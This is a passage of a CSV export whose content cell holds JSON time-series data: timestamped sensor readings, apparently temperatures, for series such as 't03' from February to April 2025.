id,title,username,language,date,content
        },
        {
            ""date"": ""2025-03-24 16:14:02"",
            ""value"": 21.52
        },
        {
            ""date"": ""2025-03-24 16:15:03"",
            ""value"": 21.52
        },
        {
            ""date"": ""2025-03-24 16:20:02"",
            ""value"": 21.51
        },
        {
            ""date"": ""2025-03-24 16:25:02"",
            ""value"": 21.52
        },
        {
            ""date"": ""2025-03-24 17:10:02"",
            ""value"": 21.65
        },
        {
            ""date"": ""2025-03-24 17:15:03"",
            ""value"": 21.62
        },
        {
            ""date"": ""2025-03-24 17:20:02"",
            ""value"": 21.57
        },
        {
            ""date"": ""2025-03-25 13:45:02"",
            ""value"": 20.56
        },
        {
            ""date"": ""2025-03-25 13:50:03"",
            ""value"": 20.68
        },
        {
            ""date"": ""2025-03-25 14:00:02"",
            ""value"": 20.89
        },
        {
            ""date"": ""2025-03-25 14:05:15"",
            ""value"": 20.85
        },
        {
            ""date"": ""2025-03-25 14:10:03"",
            ""value"": 20.82
        },
        {
            ""date"": ""2025-03-25 14:30:02"",
            ""value"": 20.48
        },
        {
            ""date"": ""2025-03-25 14:45:02"",
            ""value"": 20.35
        },
        {
            ""date"": ""2025-03-25 14:50:02"",
            ""value"": 20.36
        },
        {
            ""date"": ""2025-03-25 14:55:02"",
            ""value"": 20.36
        },
        {
            ""date"": ""2025-03-25 15:15:07"",
            ""value"": 20.49
        },
        {
            ""date"": ""2025-03-27 14:10:03"",
            ""value"": 22.21
        },
        {
            ""date"": ""2025-03-27 14:12:19"",
            ""value"": 22.19
        },
        {
            ""date"": ""2025-03-27 14:15:03"",
            ""value"": 22.2
        },
        {
            ""date"": ""2025-03-27 14:21:15"",
            ""value"": 22.08
        },
        {
            ""date"": ""2025-03-27 14:22:54"",
            ""value"": 22.06
        },
        {
            ""date"": ""2025-03-27 14:25:03"",
            ""value"": 22.08
        },
        {
            ""date"": ""2025-03-27 14:30:03"",
            ""value"": 21.96
        },
        {
            ""date"": ""2025-03-28 15:33:06"",
            ""value"": 21.24
        },
        {
            ""date"": ""2025-03-28 15:35:03"",
            ""value"": 21.24
        },
        {
            ""date"": ""2025-03-28 12:34:00"",
            ""value"": 21.25
        },
        {
            ""date"": ""2025-04-04 10:30:02"",
            ""value"": 13.71
        },
        {
            ""date"": ""2025-04-04 07:43:00"",
            ""value"": 13.94
        },
        {
            ""date"": ""2025-04-04 11:20:02"",
            ""value"": 14.95
        },
        {
            ""date"": ""2025-04-04 18:40:03"",
            ""value"": 19.7
        },
        {
            ""date"": ""2025-04-04 18:55:02"",
            ""value"": 20.05
        },
        {
            ""date"": ""2025-04-04 19:20:02"",
            ""value"": 19.8
        },
        {
            ""date"": ""2025-04-04 19:25:03"",
            ""value"": 19.68
        },
        {
            ""date"": ""2025-04-04 19:30:03"",
            ""value"": 19.53
        },
        {
            ""date"": ""2025-04-04 16:40:00"",
            ""value"": 19.24
        },
        {
            ""date"": ""2025-04-04 16:50:00"",
            ""value"": 18.96
        },
        {
            ""date"": ""2025-04-04 17:41:00"",
            ""value"": 19.35
        },
        {
            ""date"": ""2025-04-04 18:11:00"",
            ""value"": 19.85
        },
        {
            ""date"": ""2025-04-04 18:20:00"",
            ""value"": 20.0
        },
        {
            ""date"": ""2025-04-04 19:00:00"",
            ""value"": 20.34
        },
        {
            ""date"": ""2025-04-04 20:00:00"",
            ""value"": 20.57
        },
        {
            ""date"": ""2025-04-04 21:00:00"",
            ""value"": 20.67
        },
        {
            ""date"": ""2025-04-04 22:00:00"",
            ""value"": 20.7
        },
        {
            ""date"": ""2025-04-04 23:00:00"",
            ""value"": 20.71
        },
        {
            ""date"": ""2025-04-05 00:00:00"",
            ""value"": 20.71
        },
        {
            ""date"": ""2025-04-05 01:00:00"",
            ""value"": 20.69
        },
        {
            ""date"": ""2025-04-05 02:00:00"",
            ""value"": 20.67
        },
        {
            ""date"": ""2025-04-05 03:00:00"",
            ""value"": 20.66
        },
        {
            ""date"": ""2025-04-05 04:00:00"",
            ""value"": 20.64
        },
        {
            ""date"": ""2025-04-05 05:00:00"",
            ""value"": 20.65
        },
        {
            ""date"": ""2025-04-05 06:00:00"",
            ""value"": 20.63
        },
        {
            ""date"": ""2025-04-05 08:00:00"",
            ""value"": 20.67
        },
        {
            ""date"": ""2025-04-05 09:00:00"",
            ""value"": 20.65
        },
        {
            ""date"": ""2025-04-05 10:00:00"",
            ""value"": 20.68
        },
        {
            ""date"": ""2025-04-05 11:00:00"",
            ""value"": 20.74
        },
        {
            ""date"": ""2025-04-05 12:00:00"",
            ""value"": 20.78
        },
        {
            ""date"": ""2025-04-05 13:00:00"",
            ""value"": 20.78
        },
        {
            ""date"": ""2025-04-05 14:00:00"",
            ""value"": 20.74
        },
        {
            ""date"": ""2025-04-05 15:00:00"",
            ""value"": 20.69
        },
        {
            ""date"": ""2025-04-05 16:00:00"",
            ""value"": 20.63
        },
        {
            ""date"": ""2025-04-05 17:00:00"",
            ""value"": 20.56
        },
        {
            ""date"": ""2025-04-05 18:00:00"",
            ""value"": 20.51
        },
        {
            ""date"": ""2025-04-05 19:00:00"",
            ""value"": 20.46
        },
        {
            ""date"": ""2025-04-05 20:00:00"",
            ""value"": 20.42
        },
        {
            ""date"": ""2025-04-05 21:00:00"",
            ""value"": 20.39
        },
        {
            ""date"": ""2025-04-05 22:00:00"",
            ""value"": 20.35
        },
        {
            ""date"": ""2025-04-05 23:00:00"",
            ""value"": 20.32
        },
        {
            ""date"": ""2025-04-06 00:00:00"",
            ""value"": 20.3
        },
        {
            ""date"": ""2025-04-06 01:00:00"",
            ""value"": 20.28
        },
        {
            ""date"": ""2025-04-06 02:00:00"",
            ""value"": 20.25
        },
        {
            ""date"": ""2025-04-06 03:00:00"",
            ""value"": 20.23
        },
        {
            ""date"": ""2025-04-06 04:00:00"",
            ""value"": 20.2
        },
        {
            ""date"": ""2025-04-06 05:00:00"",
            ""value"": 20.18
        },
        {
            ""date"": ""2025-04-06 06:00:00"",
            ""value"": 20.2
        },
        {
            ""date"": ""2025-04-06 07:00:00"",
            ""value"": 20.24
        },
        {
            ""date"": ""2025-04-06 08:00:00"",
            ""value"": 20.29
        },
        {
            ""date"": ""2025-04-06 09:00:00"",
            ""value"": 20.46
        },
        {
            ""date"": ""2025-04-06 10:00:00"",
            ""value"": 20.6
        },
        {
            ""date"": ""2025-04-06 11:00:00"",
            ""value"": 20.65
        },
        {
            ""date"": ""2025-04-06 12:00:00"",
            ""value"": 20.71
        },
        {
            ""date"": ""2025-04-06 13:00:00"",
            ""value"": 20.73
        },
        {
            ""date"": ""2025-04-06 14:00:00"",
            ""value"": 20.72
        },
        {
            ""date"": ""2025-04-06 15:00:00"",
            ""value"": 20.69
        },
        {
            ""date"": ""2025-04-06 16:00:00"",
            ""value"": 20.66
        },
        {
            ""date"": ""2025-04-06 17:00:00"",
            ""value"": 20.6
        },
        {
            ""date"": ""2025-04-06 18:00:00"",
            ""value"": 20.57
        },
        {
            ""date"": ""2025-04-06 19:00:00"",
            ""value"": 20.54
        },
        {
            ""date"": ""2025-04-06 20:00:00"",
            ""value"": 20.49
        },
        {
            ""date"": ""2025-04-06 21:00:00"",
            ""value"": 20.47
        },
        {
            ""date"": ""2025-04-06 22:00:00"",
            ""value"": 20.45
        },
        {
            ""date"": ""2025-04-06 23:00:00"",
            ""value"": 20.43
        },
        {
            ""date"": ""2025-04-07 00:00:00"",
            ""value"": 20.4
        },
        {
            ""date"": ""2025-04-07 01:00:00"",
            ""value"": 20.37
        },
        {
            ""date"": ""2025-04-07 02:00:00"",
            ""value"": 20.35
        },
        {
            ""date"": ""2025-04-07 03:00:00"",
            ""value"": 20.32
        },
        {
            ""date"": ""2025-04-07 04:00:00"",
            ""value"": 20.3
        },
        {
            ""date"": ""2025-04-07 05:00:00"",
            ""value"": 20.27
        },
        {
            ""date"": ""2025-04-07 06:00:00"",
            ""value"": 20.23
        },
        {
            ""date"": ""2025-04-07 07:00:00"",
            ""value"": 20.2
        },
        {
            ""date"": ""2025-04-07 08:00:00"",
            ""value"": 18.49
        },
        {
            ""date"": ""2025-04-07 09:00:00"",
            ""value"": 15.03
        },
        {
            ""date"": ""2025-04-07 12:23:10"",
            ""value"": 15.64
        },
        {
            ""date"": ""2025-04-07 12:25:02"",
            ""value"": 15.64
        },
        {
            ""date"": ""2025-04-07 09:28:00"",
            ""value"": 15.86
        },
        {
            ""date"": ""2025-04-07 09:38:00"",
            ""value"": 16.31
        },
        {
            ""date"": ""2025-04-07 13:25:02"",
            ""value"": 18.94
        },
        {
            ""date"": ""2025-04-07 13:30:03"",
            ""value"": 19.34
        }
    ],
    ""t03"": [
        {
            ""date"": ""2025-02-17 15:15:02"",
            ""value"": 19.4
        },
        {
            ""date"": ""2025-02-21 16:20:02"",
            ""value"": 19.39
        },
        {
            ""date"": ""2025-02-21 16:25:02"",
            ""value"": 19.38
        },
        {
            ""date"": ""2025-02-24 13:20:03"",
            ""value"": 19.24
        },
        {
            ""date"": ""2025-02-24 13:25:02"",
            ""value"": 19.28
        },
        {
            ""date"": ""2025-02-24 13:40:03"",
            ""value"": 19.13
        },
        {
            ""date"": ""2025-02-24 10:40:00"",
            ""value"": 19.15
        },
        {
            ""date"": ""2025-02-24 10:45:00"",
            ""value"": 19.2
        },
        {
            ""date"": ""2025-02-24 10:50:00"",
            ""value"": 19.25
        },
        {
            ""date"": ""2025-02-24 10:55:00"",
            ""value"": 19.29
        },
        {
            ""date"": ""2025-02-24 11:00:00"",
            ""value"": 19.33
        },
        {
            ""date"": ""2025-02-24 11:05:00"",
            ""value"": 19.36
        },
        {
            ""date"": ""2025-02-24 11:10:00"",
            ""value"": 19.39
        },
        {
            ""date"": ""2025-02-24 11:15:00"",
            ""value"": 19.44
        },
        {
            ""date"": ""2025-02-24 11:20:00"",
            ""value"": 19.47
        },
        {
            ""date"": ""2025-02-24 11:26:00"",
            ""value"": 19.5
        },
        {
            ""date"": ""2025-02-24 11:31:00"",
            ""value"": 19.54
        },
        {
            ""date"": ""2025-02-24 11:35:00"",
            ""value"": 19.27
        },
        {
            ""date"": ""2025-02-24 12:00:00"",
            ""value"": 18.93
        },
        {
            ""date"": ""2025-02-24 16:00:02"",
            ""value"": 19.54
        },
        {
            ""date"": ""2025-02-24 16:05:03"",
            ""value"": 19.53
        },
        {
            ""date"": ""2025-02-24 16:10:04"",
            ""value"": 19.5
        },
        {
            ""date"": ""2025-02-24 16:15:02"",
            ""value"": 19.48
        },
        {
            ""date"": ""2025-02-24 16:20:03"",
            ""value"": 19.44
        },
        {
            ""date"": ""2025-03-07 11:30:03"",
            ""value"": 18.84
        },
        {
            ""date"": ""2025-03-07 08:45:00"",
            ""value"": 19.16
        },
        {
            ""date"": ""2025-03-12 14:50:03"",
            ""value"": 19.73
        },
        {
            ""date"": ""2025-03-13 17:50:02"",
            ""value"": 20.6
        },
        {
            ""date"": ""2025-03-13 18:00:03"",
            ""value"": 20.56
        },
        {
            ""date"": ""2025-03-13 18:05:02"",
            ""value"": 20.58
        },
        {
            ""date"": ""2025-03-18 19:10:02"",
            ""value"": 22.63
        },
        {
            ""date"": ""2025-03-18 16:15:00"",
            ""value"": 22.63
        },
        {
            ""date"": ""2025-03-18 16:20:00"",
            ""value"": 22.64
        },
        {
            ""date"": ""2025-03-18 19:25:02"",
            ""value"": 22.66
        },
        {
            ""date"": ""2025-03-18 16:27:00"",
            ""value"": 22.66
        },
        {
            ""date"": ""2025-03-18 16:32:00"",
            ""value"": 22.67
        },
        {
            ""date"": ""2025-03-18 16:37:00"",
            ""value"": 22.68
        },
        {
            ""date"": ""2025-03-18 16:42:00"",
            ""value"": 22.69
        },
        {
            ""date"": ""2025-03-18 16:47:00"",
            ""value"": 22.71
        },
        {
            ""date"": ""2025-03-18 16:52:00"",
            ""value"": 22.73
        },
        {
            ""date"": ""2025-03-18 16:57:00"",
            ""value"": 22.74
        },
        {
            ""date"": ""2025-03-18 17:02:00"",
            ""value"": 22.75
        },
        {
            ""date"": ""2025-03-18 17:08:00"",
            ""value"": 22.75
        },
        {
            ""date"": ""2025-03-20 10:25:02"",
            ""value"": 20.89
        },
        {
            ""date"": ""2025-03-20 07:25:00"",
            ""value"": 20.91
        },
        {
            ""date"": ""2025-03-20 10:30:02"",
            ""value"": 20.94
        },
        {
            ""date"": ""2025-03-20 07:31:00"",
            ""value"": 20.95
        },
        {
            ""date"": ""2025-03-20 07:36:00"",
            ""value"": 21.0
        },
        {
            ""date"": ""2025-03-20 07:41:00"",
            ""value"": 21.03
        },
        {
            ""date"": ""2025-03-20 10:50:03"",
            ""value"": 21.05
        },
        {
            ""date"": ""2025-03-20 10:55:01"",
            ""value"": 21.11
        },
        {
            ""date"": ""2025-03-20 10:55:02"",
            ""value"": 21.11
        },
        {
            ""date"": ""2025-03-20 07:56:00"",
            ""value"": 21.13
        },
        {
            ""date"": ""2025-03-20 08:01:00"",
            ""value"": 21.17
        },
        {
            ""date"": ""2025-03-20 11:07:54"",
            ""value"": 21.21
        },
        {
            ""date"": ""2025-03-20 11:10:02"",
            ""value"": 21.21
        },
        {
            ""date"": ""2025-03-20 08:09:00"",
            ""value"": 21.23
        },
        {
            ""date"": ""2025-03-20 08:14:00"",
            ""value"": 21.28
        },
        {
            ""date"": ""2025-03-20 08:19:00"",
            ""value"": 21.33
        },
        {
            ""date"": ""2025-03-20 08:24:00"",
            ""value"": 21.35
        },
        {
            ""date"": ""2025-03-20 08:29:00"",
            ""value"": 21.39
        },
        {
            ""date"": ""2025-03-20 08:34:00"",
            ""value"": 21.44
        },
        {
            ""date"": ""2025-03-20 08:39:00"",
            ""value"": 21.49
        },
        {
            ""date"": ""2025-03-20 08:44:00"",
            ""value"": 21.53
        },
        {
            ""date"": ""2025-03-20 08:49:00"",
            ""value"": 21.57
        },
        {
            ""date"": ""2025-03-20 08:54:00"",
            ""value"": 21.59
        },
        {
            ""date"": ""2025-03-20 08:59:00"",
            ""value"": 21.6
        },
        {
            ""date"": ""2025-03-20 09:03:00"",
            ""value"": 21.57
        },
        {
            ""date"": ""2025-03-20 10:00:00"",
            ""value"": 21.21
        },
        {
            ""date"": ""2025-03-20 11:00:00"",
            ""value"": 21.32
        },
        {
            ""date"": ""2025-03-20 17:07:32"",
            ""value"": 22.11
        },
        {
            ""date"": ""2025-03-20 17:10:02"",
            ""value"": 22.11
        },
        {
            ""date"": ""2025-03-20 14:13:00"",
            ""value"": 22.12
        },
        {
            ""date"": ""2025-03-20 14:18:00"",
            ""value"": 22.13
        },
        {
            ""date"": ""2025-03-20 14:23:00"",
            ""value"": 22.13
        },
        {
            ""date"": ""2025-03-20 14:28:00"",
            ""value"": 22.13
        },
        {
            ""date"": ""2025-03-20 14:33:00"",
            ""value"": 22.14
        },
        {
            ""date"": ""2025-03-20 14:38:00"",
            ""value"": 22.14
        },
        {
            ""date"": ""2025-03-20 14:43:00"",
            ""value"": 22.15
        },
        {
            ""date"": ""2025-03-20 14:48:00"",
            ""value"": 22.15
        },
        {
            ""date"": ""2025-03-20 14:53:00"",
            ""value"": 22.17
        },
        {
            ""date"": ""2025-03-20 14:58:00"",
            ""value"": 22.17
        },
        {
            ""date"": ""2025-03-20 15:03:00"",
            ""value"": 22.17
        },
        {
            ""date"": ""2025-03-20 15:07:00"",
            ""value"": 22.17
        },
        {
            ""date"": ""2025-03-21 11:45:03"",
            ""value"": 21.64
        },
        {
            ""date"": ""2025-03-21 11:53:42"",
            ""value"": 21.75
        },
        {
            ""date"": ""2025-03-21 11:55:02"",
            ""value"": 21.75
        },
        {
            ""date"": ""2025-03-21 08:54:00"",
            ""value"": 21.78
        },
        {
            ""date"": ""2025-03-21 08:59:00"",
            ""value"": 21.83
        },
        {
            ""date"": ""2025-03-21 12:04:36"",
            ""value"": 21.83
        },
        {
            ""date"": ""2025-03-21 12:05:10"",
            ""value"": 21.83
        },
        {
            ""date"": ""2025-03-21 09:05:00"",
            ""value"": 21.86
        },
        {
            ""date"": ""2025-03-21 09:10:00"",
            ""value"": 21.87
        },
        {
            ""date"": ""2025-03-21 09:15:00"",
            ""value"": 21.89
        },
        {
            ""date"": ""2025-03-21 09:20:00"",
            ""value"": 21.91
        },
        {
            ""date"": ""2025-03-21 09:25:00"",
            ""value"": 21.94
        },
        {
            ""date"": ""2025-03-21 09:31:00"",
            ""value"": 21.97
        },
        {
            ""date"": ""2025-03-21 09:36:00"",
            ""value"": 22.0
        },
        {
            ""date"": ""2025-03-21 14:18:56"",
            ""value"": 22.25
        },
        {
            ""date"": ""2025-03-21 14:20:02"",
            ""value"": 22.25
        },
        {
            ""date"": ""2025-03-21 11:20:00"",
            ""value"": 22.25
        },
        {
            ""date"": ""2025-03-21 11:25:00"",
            ""value"": 22.25
        },
        {
            ""date"": ""2025-03-21 11:30:00"",
            ""value"": 22.25
        },
        {
            ""date"": ""2025-03-21 11:35:00"",
            ""value"": 22.25
        },
        {
            ""date"": ""2025-03-21 11:40:00"",
            ""value"": 22.26
        },
        {
            ""date"": ""2025-03-21 11:44:00"",
            ""value"": 22.28
        },
        {
            ""date"": ""2025-03-21 12:00:00"",
            ""value"": 22.3
        },
        {
            ""date"": ""2025-03-21 13:00:00"",
            ""value"": 21.69
        },
        {
            ""date"": ""2025-03-21 16:18:18"",
            ""value"": 21.53
        },
        {
            ""date"": ""2025-03-21 16:20:02"",
            ""value"": 21.53
        },
        {
            ""date"": ""2025-03-21 13:19:00"",
            ""value"": 21.47
        },
        {
            ""date"": ""2025-03-21 13:24:00"",
            ""value"": 21.44
        },
        {
            ""date"": ""2025-03-21 17:02:16"",
            ""value"": 21.27
        },
        {
            ""date"": ""2025-03-21 14:03:00"",
            ""value"": 21.26
        },
        {
            ""date"": ""2025-03-21 17:05:02"",
            ""value"": 21.27
        },
        {
            ""date"": ""2025-03-21 14:08:00"",
            ""value"": 21.24
        },
        {
            ""date"": ""2025-03-21 14:13:00"",
            ""value"": 21.21
        },
        {
            ""date"": ""2025-03-21 14:18:00"",
            ""value"": 21.19
        },
        {
            ""date"": ""2025-03-21 14:23:00"",
            ""value"": 21.17
        },
        {
            ""date"": ""2025-03-21 14:28:00"",
            ""value"": 21.14
        },
        {
            ""date"": ""2025-03-21 14:33:00"",
            ""value"": 21.11
        },
        {
            ""date"": ""2025-03-21 14:38:00"",
            ""value"": 21.1
        },
        {
            ""date"": ""2025-03-21 14:43:00"",
            ""value"": 21.08
        },
        {
            ""date"": ""2025-03-21 14:48:00"",
            ""value"": 21.08
        },
        {
            ""date"": ""2025-03-21 14:53:00"",
            ""value"": 21.07
        },
        {
            ""date"": ""2025-03-21 14:57:00"",
            ""value"": 21.08
        },
        {
            ""date"": ""2025-03-21 16:00:00"",
            ""value"": 20.97
        },
        {
            ""date"": ""2025-03-21 19:52:31"",
            ""value"": 20.86
        },
        {
            ""date"": ""2025-03-21 19:55:02"",
            ""value"": 20.86
        },
        {
            ""date"": ""2025-03-21 16:58:00"",
            ""value"": 20.85
        },
        {
            ""date"": ""2025-03-21 17:03:00"",
            ""value"": 20.84
        },
        {
            ""date"": ""2025-03-21 17:08:00"",
            ""value"": 20.85
        },
        {
            ""date"": ""2025-03-21 17:13:00"",
            ""value"": 20.86
        },
        {
            ""date"": ""2025-03-21 17:18:00"",
            ""value"": 20.88
        },
        {
            ""date"": ""2025-03-21 17:23:00"",
            ""value"": 20.91
        },
        {
            ""date"": ""2025-03-21 17:28:00"",
            ""value"": 20.93
        },
        {
            ""date"": ""2025-03-21 17:33:00"",
            ""value"": 20.95
        },
        {
            ""date"": ""2025-03-21 17:38:00"",
            ""value"": 20.99
        },
        {
            ""date"": ""2025-03-21 17:43:00"",
            ""value"": 21.0
        },
        {
            ""date"": ""2025-03-21 17:48:00"",
            ""value"": 21.02
        },
        {
            ""date"": ""2025-03-21 17:52:00"",
            ""value"": 21.05
        },
        {
            ""date"": ""2025-03-21 18:00:00"",
            ""value"": 21.07
        },
        {
            ""date"": ""2025-03-21 19:00:00"",
            ""value"": 21.11
        },
        {
            ""date"": ""2025-03-21 20:00:00"",
            ""value"": 21.03
        },
        {
            ""date"": ""2025-03-21 21:00:00"",
            ""value"": 20.81
        },
        {
            ""date"": ""2025-03-21 22:00:00"",
            ""value"": 20.68
        },
        {
            ""date"": ""2025-03-22 03:00:00"",
            ""value"": 20.47
        },
        {
            ""date"": ""2025-03-22 04:00:00"",
            ""value"": 20.4
        },
        {
            ""date"": ""2025-03-22 05:00:00"",
            ""value"": 20.28
        },
        {
            ""date"": ""2025-03-22 06:00:00"",
            ""value"": 20.43
        },
        {
            ""date"": ""2025-03-22 07:00:00"",
            ""value"": 20.6
        },
        {
            ""date"": ""2025-03-22 08:00:00"",
            ""value"": 20.75
        },
        {
            ""date"": ""2025-03-22 09:00:00"",
            ""value"": 20.99
        },
        {
            ""date"": ""2025-03-22 10:00:00"",
            ""value"": 20.99
        },
        {
            ""date"": ""2025-03-22 11:00:00"",
            ""value"": 20.96
        },
        {
            ""date"": ""2025-03-22 12:00:00"",
            ""value"": 20.94
        },
        {
            ""date"": ""2025-03-22 13:00:00"",
            ""value"": 20.9
        },
        {
            ""date"": ""2025-03-22 14:00:00"",
            ""value"": 20.87
        },
        {
            ""date"": ""2025-03-22 15:00:00"",
            ""value"": 20.84
        },
        {
            ""date"": ""2025-03-22 16:00:00"",
            ""value"": 20.78
        },
        {
            ""date"": ""2025-03-22 17:00:00"",
            ""value"": 20.72
        },
        {
            ""date"": ""2025-03-22 18:00:00"",
            ""value"": 20.64
        },
        {
            ""date"": ""2025-03-22 19:00:00"",
            ""value"": 20.55
        },
        {
            ""date"": ""2025-03-22 20:00:00"",
            ""value"": 20.47
        },
        {
            ""date"": ""2025-03-22 21:00:00"",
            ""value"": 20.36
        },
        {
            ""date"": ""2025-03-22 22:00:00"",
            ""value"": 20.22
        },
        {
            ""date"": ""2025-03-23 03:00:00"",
            ""value"": 19.75
        },
        {
            ""date"": ""2025-03-23 04:00:00"",
            ""value"": 19.66
        },
        {
            ""date"": ""2025-03-23 05:00:00"",
            ""value"": 19.65
        },
        {
            ""date"": ""2025-03-23 06:00:00"",
            ""value"": 19.9
        },
        {
            ""date"": ""2025-03-23 07:00:00"",
            ""value"": 20.17
        },
        {
            ""date"": ""2025-03-23 08:00:00"",
            ""value"": 20.55
        },
        {
            ""date"": ""2025-03-23 09:00:00"",
            ""value"": 20.86
        },
        {
            ""date"": ""2025-03-23 10:00:00"",
            ""value"": 20.89
        },
        {
            ""date"": ""2025-03-23 11:00:00"",
            ""value"": 20.84
        },
        {
            ""date"": ""2025-03-23 12:00:00"",
            ""value"": 20.78
        },
        {
            ""date"": ""2025-03-23 13:00:00"",
            ""value"": 20.74
        },
        {
            ""date"": ""2025-03-23 14:00:00"",
            ""value"": 20.71
        },
        {
            ""date"": ""2025-03-23 15:00:00"",
            ""value"": 20.66
        },
        {
            ""date"": ""2025-03-23 16:00:00"",
            ""value"": 20.61
        },
        {
            ""date"": ""2025-03-23 17:00:00"",
            ""value"": 20.51
        },
        {
            ""date"": ""2025-03-23 18:00:00"",
            ""value"": 20.43
        },
        {
            ""date"": ""2025-03-23 19:00:00"",
            ""value"": 20.31
        },
        {
            ""date"": ""2025-03-23 20:00:00"",
            ""value"": 20.22
        },
        {
            ""date"": ""2025-03-23 21:00:00"",
            ""value"": 20.19
        },
        {
            ""date"": ""2025-03-23 22:00:00"",
            ""value"": 20.14
        },
        {
            ""date"": ""2025-03-24 03:00:00"",
            ""value"": 19.97
        },
        {
            ""date"": ""2025-03-24 04:00:00"",
            ""value"": 19.93
        },
        {
            ""date"": ""2025-03-24 05:00:00"",
            ""value"": 19.89
        },
        {
            ""date"": ""2025-03-24 06:00:00"",
            ""value"": 20.05
        },
        {
            ""date"": ""2025-03-24 07:00:00"",
            ""value"": 20.62
        },
        {
            ""date"": ""2025-03-24 08:00:00"",
            ""value"": 21.18
        },
        {
            ""date"": ""2025-03-24 09:00:00"",
            ""value"": 21.83
        },
        {
            ""date"": ""2025-03-24 10:00:00"",
            ""value"": 21.75
        },
        {
            ""date"": ""2025-03-24 11:00:00"",
            ""value"": 21.7
        },
        {
            ""date"": ""2025-03-24 12:00:00"",
            ""value"": 21.83
        },
        {
            ""date"": ""2025-03-24 13:00:00"",
            ""value"": 21.61
        },
        {
            ""date"": ""2025-03-24 16:14:02"",
            ""value"": 21.58
        },
        {
            ""date"": ""2025-03-24 16:15:03"",
            ""value"": 21.58
        },
        {
            ""date"": ""2025-03-24 16:20:02"",
            ""value"": 21.56
        },
        {
            ""date"": ""2025-03-24 16:25:02"",
            ""value"": 21.52
        },
        {
            ""date"": ""2025-03-24 17:10:02"",
            ""value"": 21.88
        },
        {
            ""date"": ""2025-03-24 17:15:03"",
            ""value"": 21.86
        },
        {
            ""date"": ""2025-03-24 17:20:02"",
            ""value"": 21.77
        },
        {
            ""date"": ""2025-03-25 13:45:02"",
            ""value"": 20.78
        },
        {
            ""date"": ""2025-03-25 13:50:03"",
            ""value"": 20.89
        },
        {
            ""date"": ""2025-03-25 14:00:02"",
            ""value"": 21.12
        },
        {
            ""date"": ""2025-03-25 14:05:15"",
            ""value"": 20.98
        },
        {
            ""date"": ""2025-03-25 14:10:03"",
            ""value"": 20.91
        },
        {
            ""date"": ""2025-03-25 14:30:02"",
            ""value"": 20.8
        },
        {
            ""date"": ""2025-03-25 14:45:02"",
            ""value"": 20.96
        },
        {
            ""date"": ""2025-03-25 14:50:02"",
            ""value"": 20.95
        },
        {
            ""date"": ""2025-03-25 14:55:02"",
            ""value"": 20.96
        },
        {
            ""date"": ""2025-03-25 15:15:07"",
            ""value"": 21.02
        },
        {
            ""date"": ""2025-03-27 14:10:03"",
            ""value"": 22.36
        },
        {
            ""date"": ""2025-03-27 14:12:19"",
            ""value"": 22.28
        },
        {
            ""date"": ""2025-03-27 14:15:03"",
            ""value"": 22.3
        },
        {
            ""date"": ""2025-03-27 14:21:15"",
            ""value"": 22.12
        },
        {
            ""date"": ""2025-03-27 14:22:54"",
            ""value"": 22.1
        },
        {
            ""date"": ""2025-03-27 14:25:03"",
            ""value"": 22.12
        },
        {
            ""date"": ""2025-03-27 14:30:03"",
            ""value"": 22.0
        },
        {
            ""date"": ""2025-03-28 15:33:06"",
            ""value"": 21.46
        },
        {
            ""date"": ""2025-03-28 15:35:03"",
            ""value"": 21.46
        },
        {
            ""date"": ""2025-03-28 12:34:00"",
            ""value"": 21.47
        },
        {
            ""date"": ""2025-04-04 10:30:02"",
            ""value"": 13.99
        },
        {
            ""date"": ""2025-04-04 07:43:00"",
            ""value"": 14.47
        },
        {
            ""date"": ""2025-04-04 11:20:02"",
            ""value"": 15.85
        },
        {
            ""date"": ""2025-04-04 18:40:03"",
            ""value"": 20.22
        },
        {
            ""date"": ""2025-04-04 18:55:02"",
            ""value"": 20.41
        },
        {
            ""date"": ""2025-04-04 19:20:02"",
            ""value"": 19.72
        },
        {
            ""date"": ""2025-04-04 19:25:03"",
            ""value"": 19.57
        },
        {
            ""date"": ""2025-04-04 19:30:03"",
            ""value"": 19.43
        },
        {
            ""date"": ""2025-04-04 16:40:00"",
            ""value"": 19.11
        },
        {
            ""date"": ""2025-04-04 16:50:00"",
            ""value"": 18.81
        },
        {
            ""date"": ""2025-04-04 17:41:00"",
            ""value"": 19.66
        },
        {
            ""date"": ""2025-04-04 18:11:00"",
            ""value"": 20.11
        },
        {
            ""date"": ""2025-04-04 18:20:00"",
            ""value"": 20.24
        },
        {
            ""date"": ""2025-04-04 19:00:00"",
            ""value"": 20.53
        },
        {
            ""date"": ""2025-04-04 20:00:00"",
            ""value"": 20.72
        },
        {
            ""date"": ""2025-04-04 21:00:00"",
            ""value"": 20.8
        },
        {
            ""date"": ""2025-04-04 22:00:00"",
            ""value"": 20.82
        },
        {
